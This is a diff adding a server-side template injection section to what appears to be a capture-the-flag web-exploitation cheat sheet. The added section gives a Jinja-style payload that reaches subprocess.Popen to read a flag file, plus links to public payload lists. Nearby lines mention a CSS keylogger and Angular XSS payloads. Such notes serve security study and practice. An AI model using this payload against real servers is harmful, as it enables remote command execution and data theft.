@@ -111,7 +111,23 @@ If we can add css we can use the payload in `tools/css-keylogger' to capture key
 
 ### Different Angular XSS payloads
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
-    
+
+## Serverside Template Injection:
+If we can a template from user input, we can inject code in the template
+Python example:
+```python
+# In this case 356 is the index of subprocess.Popen in the list of subclasses
+{{().__class__.__bases__[0].__subclasses__()[356](["/bin/cat","flag"], stdout=-1).communicate()}}
+# loops and if are also possible :
+{% for i in range(100) %}{%if i % 2 == 0 %}{{i}}{% endif %}{% endfor %}
+```
+
+Payloads: 
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+  - Useful to check if there is a filter on characters
+
+
+
 ## JWT
 
 - https://jwt.io/
